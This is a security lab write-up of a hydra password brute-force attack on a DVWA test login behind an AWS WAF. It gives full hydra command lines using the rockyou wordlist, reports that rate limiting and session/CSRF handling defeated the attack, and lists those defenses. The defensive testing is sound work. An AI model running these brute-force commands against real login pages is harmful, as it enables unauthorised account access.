# Attack 4 — Brute Force

**Tool:** `hydra` (+ rockyou wordlist)  |  **OWASP:** A07 Identification & Auth Failures  |  **Defeated by:** WAF rate-limit + app session/CSRF

## Objective
Brute-force the DVWA login using a password wordlist.

## Commands
```bash
# full rockyou run (~14M passwords)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <DVWA-ALB-DNS> http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=test:Username and/or password incorrect" -t 8

# targeted test including the real password
hydra -l admin -P /tmp/pw.txt <DVWA-ALB-DNS> http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```

## Result — DEFEATED
- rockyou run showed **~2,360 tries/min**, **7,082 attempts in 3 min**, and an estimated **~101 hours to complete** all 14M passwords.
- In the targeted test, hydra tried the **correct password (`password`)** but still reported **"0 valid password found"** — the WAF + app session/CSRF handling prevented a confirmed login.
- **Outcome:** brute force could not crack the login. Rate limiting made a full attack impractical (~101h), and the app layer prevented credential confirmation.

## Detection / Defense
- **AWS WAF rate-based rule** (100 req / 5 min) throttles high-volume attempts.
- **Application session/CSRF handling** prevented hydra from confirming success.
- **Lesson:** rate limiting + proper auth handling defeat automated brute force.

## Evidence

### Attack surface (hydra running / 101h estimate)
![hydra 1](./Attack%20Surface/Screenshot%202026-09-13%20181632.png)
![hydra 2](./Attack%20Surface/Screenshot%202026-09-13%20182600.png)
![hydra 3](./Attack%20Surface/Screenshot%202026-09-13%20183159.png)

### Logs & evidence
![log 1](./Logs%20%26%20Evidence%20attack/Screenshot%202026-09-13%20182549.png)
![log 2](./Logs%20%26%20Evidence%20attack/Screenshot%202026-09-13%20182752.png)
![log 3](./Logs%20%26%20Evidence%20attack/Screenshot%202026-09-13%20182804.png)
![log 4](./Logs%20%26%20Evidence%20attack/Screenshot%202026-09-13%20182813.png)
